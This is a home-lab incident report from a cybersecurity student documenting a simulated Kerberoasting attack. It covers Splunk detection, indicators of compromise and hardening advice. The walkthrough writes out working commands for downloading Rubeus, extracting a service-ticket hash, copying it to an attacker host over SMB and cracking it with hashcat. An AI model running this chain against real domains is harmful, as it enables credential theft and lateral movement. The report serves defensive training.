# Incident Report — Kerberoasting Attack
## MITRE ATT&CK T1558.003 | Lab Environment Simulation

---


## 1. Executive Summary

This report documents a simulated **Kerberoasting attack** conducted within a controlled home lab environment as part of an ongoing cybersecurity portfolio project. The attacker assumed the role of a domain-authenticated user with no special privileges and successfully extracted, exfiltrated, and cracked a Kerberos service ticket hash belonging to the `svc-mssql` service account.

The attack exploited the inherent behavior of the Kerberos protocol: any authenticated domain user can request a Ticket Granting Service (TGS) ticket for any registered Service Principal Name (SPN). These tickets are encrypted using the service account's NTLM password hash, making them vulnerable to offline brute-force cracking. In this simulation, the password was successfully recovered using Hashcat against a custom wordlist.

**Key Findings:**
- The service account `svc-mssql` used a weak, crackable password (`Password123!`)
- Rubeus v2.2.0 was used to perform the roasting and output the hash in crackable format
- Event ID **4769** with Ticket Encryption Type **0x17 (RC4-HMAC)** was the primary detection signal
- Splunk successfully detected the anomalous TGS request within the simulated environment

---

## 2. Environment Overview

| Component | Role | IP Address |
|---|---|---|
| Windows Server 2022 (DC01) | Domain Controller — CORP.LOCAL | 192.168.100.10 |
| Windows 10 (Client) | Compromised Endpoint (Attacker-controlled) | 192.168.100.50 |
| Kali Linux | Attacker Machine / Hash Cracking | 192.168.100.54 |
| Ubuntu / Splunk | SIEM — Log Collection & Detection | 192.168.100.51 |

**Domain:** `corp.local`  
**Targeted Service Account:** `svc-mssql` (SPN: `MSSQLSvc/sql01.corp.local:1433`)  
**Tool Used:** Rubeus v2.2.0, Hashcat v7.1.2, Impacket SMB Server

---

## 3. Attack Timeline

| Time (2026-05-12) | Event |
|---|---|
| 06:07 AM | Rubeus.exe downloaded to `C:\Tools\` on the Windows 10 endpoint |
| 06:08 AM | Rubeus executed — Kerberoast action requested; hash written to `C:\Tools\hashes.txt` |
| 06:08 AM | `hashes.txt` copied to Kali Linux via SMB share (`\\192.168.100.54\share\`) |
| 06:08 AM | **Event ID 4769** generated on Domain Controller (TGS request for `svc-mssql`, RC4-HMAC) |
| ~06:08 AM | Hashcat launched on Kali against `hashes.txt` using custom wordlist (`/tmp/custom_wordlist.txt`) |
| ~06:08 AM | Password cracked: **`Password123!`** — output saved to `cracked.txt` |
| 07:08 AM | Detection confirmed in Windows Event Viewer (Event ID 4769 filter applied) |
| 07:08 AM | Detection confirmed in Splunk via SPL query |

---

## 4. Attack Walkthrough

### Step 1 — Tool Staging: Downloading Rubeus

The attacker used PowerShell on the compromised Windows 10 machine to download **Rubeus** directly from GitHub into `C:\Tools\`:

```powershell
Invoke-WebRequest `
  -Uri "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" `
  -OutFile "C:\Tools\Rubeus.exe"

Get-Item "C:\Tools\Rubeus.exe"
```



### Step 2 — Kerberoasting: Extracting the TGS Hash

Rubeus was executed with the `kerberoast` action, which queries Active Directory via LDAP for all accounts with registered SPNs and requests TGS tickets for each:

```powershell
cd C:\Tools
.\Rubeus.exe kerberoast /outfile:C:\Tools\hashes.txt
```


**Rubeus output (key fields):**

| Field | Value |
|---|---|
| Target Domain | `corp.local` |
| Kerberoastable Users | **1** |
| SamAccountName | `svc-mssql` |
| DistinguishedName | `CN=svc-mssql,CN=Users,DC=corp,DC=local` |
| ServicePrincipalName | `MSSQLSvc/sql01.corp.local:1433` |
| Supported ETypes | **RC4_HMAC_DEFAULT** |
| Hash Output | `C:\Tools\hashes.txt` |

> The RC4_HMAC encryption type is the critical weakness here. AES-256 tickets are computationally much harder to crack offline; RC4 tickets crack relatively quickly even on modest hardware.

---

### Step 3 — Exfiltration: Sending the Hash File to Kali

An Impacket SMB server was stood up on the Kali machine to receive the file:

```bash
impacket-smbserver share $(pwd) -smb2support
```


The hash file was then copied from the Windows 10 endpoint:

```powershell
copy C:\Tools\hashes.txt \\192.168.100.54\share\
```



### Step 4 — Offline Cracking: Hashcat

On Kali, Hashcat was used against the extracted hash. Hash mode **13100** corresponds to Kerberos 5 TGS-REP (RC4-HMAC), the exact format Rubeus outputs:

```bash
hashcat -m 13100 -a 0 hashes.txt /tmp/custom_wordlist.txt --outfile="cracked.txt" --force
```



**Hashcat configuration:**

| Parameter | Value |
|---|---|
| Hash Mode (`-m`) | `13100` — Kerberos 5 TGS-REP RC4-HMAC |
| Attack Mode (`-a`) | `0` — Dictionary attack |
| Wordlist | `/tmp/custom_wordlist.txt` (25 passwords) |
| Hardware | AMD Ryzen 7 5800X (CPU-based via OpenCL PoCL) |

---

### Step 5 — Password Recovered

Inspecting `cracked.txt` confirmed a successful crack:

```
$krb5tgs$23$*svc-mssql$corp.local$MSSQLSvc/sql01.corp.local:1433@corp.local*...:Password123!
```


The plaintext password at the end of the hash string is: **`Password123!`**

The attacker now has valid credentials for the `svc-mssql` service account and can authenticate against the MSSQL service, escalate privileges, or move laterally within the domain.

---

## 5. Detection

### 5.1 — Windows Event Viewer (DC01)

On the Domain Controller, filtering the Security log for **Event ID 4769** surfaces the malicious TGS request:



**Event 4769 — Key Fields:**

| Field | Value |
|---|---|
| Account Name | `Administrator@CORP.LOCAL` |
| Account Domain | `CORP.LOCAL` |
| Service Name | `svc-mssql` |
| Service ID | `CORP\svc-mssql` |
| Client Address | `::ffff:192.168.100.50` |
| Ticket Encryption Type | **0x17 (RC4-HMAC)** |
| Ticket Options | `0x40800000` |
| Logged | 5/12/2026 6:08:22 AM |
| Computer | `DC01.corp.local` |

> **Detection logic:** A TGS request (Event 4769) with `Ticket_Encryption_Type = 0x17` is the most reliable indicator of Kerberoasting. Modern environments enforcing AES encryption (0x12 / 0x11) should never see 0x17 tickets unless a legacy or deliberately weak configuration exists.

---

### 5.2 — Splunk Detection

Splunk ingested the Windows Security event logs forwarded from DC01 and the following SPL query surfaced the anomaly:



**SPL Query used:**
```spl
index=main sourcetype="WinEventLog:Security"
EventCode=4769 Ticket_Encryption_Type=0x17
| table _time, Account_Name, Service_Name
```

**Splunk result:**

| \_time | Account\_Name | Service\_Name |
|---|---|---|
| 2026-05-12 06:08:22.806 | Administrator@CORP.LOCAL | svc-mssql |

A single event was returned — precisely the malicious TGS request. In a production environment this query would be converted into a scheduled alert triggering on any match.

---

## 6. MITRE ATT&CK Mapping

| Field | Value |
|---|---|
| **Tactic** | Credential Access |
| **Technique** | Steal or Forge Kerberos Tickets |
| **Sub-technique** | **T1558.003 — Kerberoasting** |
| **URL** | https://attack.mitre.org/techniques/T1558/003/ |

### Kill Chain Phases Observed

| Phase | Activity | Tools |
|---|---|---|
| **Initial Access** | Assumed — authenticated domain user access | *(Given)* |
| **Discovery** | LDAP query for SPN-registered accounts | Rubeus (LDAP enumeration) |
| **Credential Access** | TGS request and hash extraction (Kerberoasting) | Rubeus v2.2.0 |
| **Exfiltration** | Hash file sent to attacker machine | Impacket SMB Server |
| **Credential Access (offline)** | Offline dictionary crack of RC4-HMAC hash | Hashcat v7.1.2 |

---

## 7. SPL Query — Splunk Detection

### Primary Detection Query

```spl
index=main sourcetype="WinEventLog:Security"
EventCode=4769 Ticket_Encryption_Type=0x17
| table _time, Account_Name, Service_Name, Client_Address
```

### Enhanced Hunting Query (Production Recommended)

```spl
index=main sourcetype="WinEventLog:Security"
EventCode=4769 Ticket_Encryption_Type=0x17
| stats count by Account_Name, Service_Name, Client_Address
| where count > 0
| sort -count
```

### Alert Rule Recommendation

```spl
index=main sourcetype="WinEventLog:Security"
EventCode=4769 Ticket_Encryption_Type=0x17
NOT Service_Name="krbtgt"
NOT Service_Name="*$"
| eval alert="KERBEROASTING_SUSPECTED"
| table _time, alert, Account_Name, Service_Name, Client_Address
```

> Excluding `krbtgt` and machine accounts (`*$`) reduces noise from normal domain operations while preserving signal for human-controlled service account roasting.

---

## 8. Indicators of Compromise (IOCs)

| Type | Value | Context |
|---|---|---|
| **Event ID** | 4769 | Kerberos TGS Request |
| **Encryption Type** | 0x17 (RC4-HMAC) | Weak ticket — roastable |
| **Service Account** | `svc-mssql` / `CORP\svc-mssql` | Targeted SPN account |
| **SPN** | `MSSQLSvc/sql01.corp.local:1433` | Roasted service |
| **Requesting Account** | `Administrator@CORP.LOCAL` | Source of malicious request |
| **Source IP** | `192.168.100.50` | Compromised Windows 10 endpoint |
| **Tool Artifact** | `C:\Tools\Rubeus.exe` (446,976 bytes) | Offensive tooling |
| **Tool Artifact** | `C:\Tools\hashes.txt` | Hash output file |
| **SMB Share** | `\\192.168.100.54\share\` | Exfiltration destination |
| **Cracked Credential** | `svc-mssql` : `Password123!` | Recovered plaintext |

---

## 9. Recommendations

### Immediate

1. **Force password reset** for all service accounts with SPNs registered — use long, randomly generated passwords (minimum 25 characters). This makes offline cracking computationally infeasible even if hashes are obtained.

2. **Enforce AES encryption** — configure Group Policy to require AES-256 (0x12) or AES-128 (0x11) for Kerberos tickets. Accounts supporting only RC4 should be flagged and updated.

3. **Audit all SPNs** in the domain:
   ```powershell
   Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
   ```
   Remove unused or unnecessary SPNs.

### Short-Term

4. **Deploy Managed Service Accounts (gMSA)** — Group Managed Service Accounts automatically rotate passwords (240-character random), eliminating the crackable password risk entirely.

5. **Enable Splunk alert** for Event 4769 with `Ticket_Encryption_Type=0x17` — configure a real-time alert to notify the SOC team on any match outside of known/baseline behavior.

6. **Deploy endpoint detection** — tools like Sysmon can log process creation (Rubeus execution) and network connections to the Domain Controller, providing a secondary detection layer.

### Long-Term

7. **Privilege tiering** — limit which accounts have SPNs registered; service accounts should not have interactive logon rights or elevated group memberships beyond what the service requires.

8. **Canary service accounts** — deploy honeypot service accounts with SPNs registered but no legitimate use. Any TGS request for these accounts is an unambiguous IOC.

9. **Regular purple team exercises** — repeat this simulation quarterly to validate detection coverage as the environment evolves.

---

## 10. Conclusion

This lab exercise demonstrated a complete Kerberoasting attack chain from tool staging to credential recovery, and validated detection using both native Windows tooling (Event Viewer) and a centralized SIEM (Splunk). The attack required no special privileges beyond a valid domain user session, highlighting how dangerous weak service account passwords are in Active Directory environments.

The key takeaways are:

- **Kerberoasting is low-noise by design** — it abuses legitimate Kerberos functionality and generates only a single Event 4769 per service account targeted
- **RC4-HMAC (0x17) is the detection fingerprint** — enforcing AES eliminates this signal entirely from the attacker's perspective
- **Password complexity is the last line of defense** — once the hash is obtained, the only protection is the password strength itself
- **Detection is achievable** — a single Splunk rule with a well-scoped SPL query can catch this attack in near real-time

---

*Report prepared by Kouraich | Algonquin College — Cybersecurity Program | Home SOC Lab Portfolio*  
*MITRE ATT&CK Reference: [T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)*
